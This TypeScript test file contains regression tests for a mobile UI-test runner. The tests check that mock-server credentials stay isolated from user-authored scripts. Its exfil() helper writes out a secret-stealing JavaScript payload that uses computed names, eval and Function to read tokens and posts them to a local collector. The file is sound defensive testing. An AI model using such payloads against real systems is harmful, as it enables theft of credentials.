// Explicit Mac/simulator regression for final SPEC §8.10 Step 1; excluded from npm test.
import {test} from 'node:test';
import assert from 'node:assert/strict';
import {createServer} from 'node:http';
import {execFile,spawn} from 'node:child_process';
import {promisify} from 'node:util';
import {mkdtemp,writeFile,readFile,rm,access,realpath} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {randomBytes} from 'node:crypto';
import {stringify} from 'yaml';
import {createMaestro} from '../../server/maestro.js';
import {createRunner} from '../../server/runner.js';
import {createScenarios} from '../../server/scenarios.js';
import {buildRunPlan,scriptExecutionYaml} from '../../server/run-script-plan.js';
import {referenceCatalog} from '../../server/canvas.js';
import {scriptHash} from '../../server/script-trust-store.js';
import {protectRunEvidence} from '../../server/run-script-evidence.js';
import {createMockSession} from '../../server/mockoon.js';
const deviceId=process.env.TNT_REAL_DEVICE;
if(!deviceId)throw new Error('Set TNT_REAL_DEVICE for this explicitly invoked real-tool suite.');
const exec=promisify(execFile);
async function collector(){
 const received:any[]=[];const server=createServer(async(req,res)=>{let body='';for await(const chunk of req)body+=chunk;received.push(JSON.parse(body));res.end('ok');});
 await new Promise<void>(r=>server.listen(0,'127.0.0.1',r));const address=server.address();if(!address||typeof address==='string')throw new Error('No port');
 return {received,url:'http://127.0.0.1:'+address.port,close:()=>new Promise<void>(r=>server.close(()=>r()))};
}
// Includes Edison's computed-name exfil, indirect eval/Function, and enumeration.
function exfil(url:string,label:string){return `var result={label:${JSON.stringify(label)},reads:[]}; ['TOKEN','URL'].forEach(function(suffix){var name=['TNT','MOCK',suffix].join('_');result.reads.push({computed:String(globalThis[name]),evaluated:eval('typeof '+name),constructed:Function('return typeof '+name)()});});result.names=Object.getOwnPropertyNames(globalThis).filter(function(key){return key.indexOf(['TNT','MOCK',''].join('_'))===0;});http.post(${JSON.stringify(url)},{body:JSON.stringify(result)});`;}
function noExfil(received:any[]){for(const entry of received){assert.deepEqual(entry.reads,[{computed:'undefined',evaluated:'undefined',constructed:'undefined'},{computed:'undefined',evaluated:'undefined',constructed:'undefined'}],entry.label);assert.deepEqual(entry.names,[],entry.label);}}

test('real Maestro step-only env isolates both credentials from authored JS, expressions, hooks and subflows',async()=>{
 const sink=await collector();const root=await realpath(await mkdtemp(join(tmpdir(),'tnt-real-scope-')));const token=randomBytes(32).toString('hex');let home:string|undefined;let argv:string[]=[];
 const runner=createRunner({artifactDirectory:root,ownershipDirectory:process.env.TNT_REAL_OWNERSHIP_DIR??root,execute:async(file,args)=>exec(file,args,{encoding:'utf8',timeout:30000})});
 const release=await runner.acquireDevice(deviceId!);let verified=false;
 try{
  const code=(label:string)=>exfil(sink.url,label);
  const owned='if (typeof TNT_MOCK_TOKEN !== "string" || typeof TNT_MOCK_URL !== "string") throw new Error("Own env unavailable");http.post('+JSON.stringify(sink.url)+',{body:JSON.stringify({label:"owned",token:TNT_MOCK_TOKEN,url:TNT_MOCK_URL})});';
  await writeFile(join(root,'authored.js'),code('authored-runScript'));
  await writeFile(join(root,'nested.yaml'),'appId: com.example.HybridApp\n---\n'+stringify([{evalScript:'${'+code('nested-runFlow')+'}'}]));
  const config={appId:'com.example.HybridApp',onFlowStart:[{evalScript:'${'+code('onFlowStart')+'}'}],onFlowComplete:[{evalScript:'${'+code('onFlowComplete')+'}'}]};
  const commands=['launchApp',{evalScript:'${'+code('before-evalScript')+'}'},{evalScript:'${'+code('after-evalScript')+'}'},{runScript:'authored.js'},{runFlow:'nested.yaml'},{inputText:'${(function(){'+code('inputText')+'return "";})()}'},{openLink:'${(function(){'+code('openLink')+'return "https://example.com";})()}'}];
  const yaml=stringify(config)+'---\n'+stringify(commands);const ref=referenceCatalog(yaml,{'nested.yaml':await readFile(join(root,'nested.yaml'),'utf8')}).references.find(ref=>ref.kind==='step'&&ref.index===2)!;
  const row={id:'owned',label:'Own script',source:owned,beforeStep:{index:2,fingerprint:ref.fingerprint}};
  const plan=buildRunPlan({yaml,flows:{'nested.yaml':await readFile(join(root,'nested.yaml'),'utf8')},scripts:[row],trust:[{rowId:row.id,origin:'local',trusted:true,hash:scriptHash(row.source)}],mockAvailable:true});assert.deepEqual(plan.blocked,[]);
  for(const file of plan.scriptFiles)await writeFile(join(root,file.name),file.content);
  await writeFile(join(root,'flow.yaml'),scriptExecutionYaml(plan,{TNT_MOCK_TOKEN:token,TNT_MOCK_URL:sink.url}));
  const maestro=createMaestro({spawn:((file,args,options)=>{home=options?.env?.HOME;argv=args as string[];return spawn(file,args!,options!);}) as typeof spawn});
  assert.equal(await maestro.version(),'2.11.0');
  const result=await maestro.run({directory:root,flow:join(root,'flow.yaml'),deviceId:deviceId!,signal:new AbortController().signal,scriptRun:true});verified=result.cleanup.verified;
  assert.equal(result.code,0,result.log);assert.equal(verified,true);assert.equal(argv.includes('-e'),false);assert.equal(home?.startsWith(root+'/'),false);await assert.rejects(access(home!),{code:'ENOENT'});
  const own=sink.received.find(entry=>entry.label==='owned');assert.equal(own.token,token);assert.equal(own.url,sink.url);
  const probes=sink.received.filter(entry=>entry.label!=='owned');assert.deepEqual(probes.map(entry=>entry.label),['onFlowStart','before-evalScript','after-evalScript','authored-runScript','nested-runFlow','inputText','openLink','onFlowComplete']);noExfil(probes);
  // This raw adapter probe deliberately includes authored runScript; production still rejects external files.
  assert.equal((await protectRunEvidence({directories:[root],token,value:result,scriptFiles:plan.scriptFiles.map(file=>join(root,file.name))})).ok,true);
 }finally{if(verified)await release();await sink.close();await rm(root,{recursive:true,force:true});}
});

test('real server regression: Edison computed/eval/Function exfil before and after a trusted mock script reads undefined',async()=>{
 const sink=await collector();const root=await realpath(await mkdtemp(join(tmpdir(),'tnt-real-exfil-')));const tokens:string[]=[];
 const runner=createRunner({artifactDirectory:root,ownershipDirectory:process.env.TNT_REAL_OWNERSHIP_DIR??root,execute:async(file,args)=>exec(file,args,{encoding:'utf8',timeout:30000})});
 const service=createScenarios({root,runner,maestro:createMaestro(),trustDirectory:join(root,'trust'),createMockSession:(...args)=>{const mock=createMockSession(...args);tokens.push(mock.scriptAccess().token);return mock;}});
 const environment=JSON.parse(await readFile(new URL('../fixtures/mockoon.json',import.meta.url),'utf8'));
 const spare=await collector();const port=Number(new URL(spare.url).port);await spare.close();
 try{
  const yaml='appId: com.example.HybridApp\n---\n'+stringify(['launchApp',{evalScript:'${'+exfil(sink.url,'before')+'}'},{evalScript:'${'+exfil(sink.url,'after')+'}'}]);
  const steps=(await service.references({yaml})).references.filter(ref=>ref.kind==='step');
  const row={id:'owned',label:'Own script',beforeStep:{index:2,fingerprint:steps[2].fingerprint},source:'var response=http.get(TNT_MOCK_URL+"/logs",{headers:{Authorization:"Bearer "+TNT_MOCK_TOKEN}});if(!response.ok)throw new Error("Own mock env unavailable");'};
  const mock={environment,port,routeId:environment.routes[0].uuid,responseId:environment.routes[0].responses[0].uuid,backendUrl:'http://127.0.0.1:4321',passthroughRouteIds:[],fromScreen:'Home',toScreen:'Home',failureSemantics:'Fixture'};
  const workspace=await service.save({name:'Exfil regression',yaml,mock,scenarios:[{id:'one',name:'One',steps,inputs:{},parameters:{},enabledHandlerIds:[],scripts:[row]}]});
  const result=await service.wait((await service.start({workspaceId:workspace.id,scenarioId:'one',deviceId:deviceId!})).id);
  assert.equal(result.status,'passed',result.error??result.log);assert.equal(result.cleanup.verified,true);assert.equal(result.scriptSteps?.owned.status,'passed');assert.deepEqual(sink.received.map(entry=>entry.label),['before','after']);noExfil(sink.received);
  for(const token of tokens){assert.equal(JSON.stringify(result).includes(token),false);for(const file of result.artifacts)assert.equal((await service.artifact(result.id,file)).includes(Buffer.from(token)),false,file);}
 }finally{await sink.close();await rm(root,{recursive:true,force:true});}
});
